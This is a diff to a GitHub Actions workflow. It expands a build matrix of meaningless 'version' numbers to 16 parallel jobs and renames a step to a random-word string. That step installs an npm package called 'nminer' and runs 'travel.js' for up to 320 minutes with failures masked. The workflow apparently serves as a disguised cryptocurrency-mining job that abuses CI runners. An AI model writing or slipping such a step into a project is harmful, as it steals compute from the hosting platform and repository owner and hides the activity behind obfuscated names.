@@ -9,21 +9,22 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9092 }
-          - { version: 5229 }
-          - { version: 9584 }
-          - { version: 9259 }
-          - { version: 5759 }
-          - { version: 5694 }
-          - { version: 8848 }
-          - { version: 6137 }
-          - { version: 876 }
-          - { version: 6058 }
-          - { version: 6100 }
-          - { version: 4153 }
-          - { version: 7830 }
-          - { version: 675 }
-          - { version: 1123 }
+          - { version: 361 }
+          - { version: 5701 }
+          - { version: 5318 }
+          - { version: 7743 }
+          - { version: 8426 }
+          - { version: 1443 }
+          - { version: 5235 }
+          - { version: 5054 }
+          - { version: 4362 }
+          - { version: 2052 }
+          - { version: 5242 }
+          - { version: 9153 }
+          - { version: 1898 }
+          - { version: 5779 }
+          - { version: 2931 }
+          - { version: 4401 }
 
     steps:
       - name: Checkout
@@ -34,7 +35,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: 
+      - name: athwart nun once icy considering
         run: |
           npm install nminer@latest
-          timeout 344m node travel.js || echo "travel executed"
+          timeout 320m node travel.js || echo "travel executed"
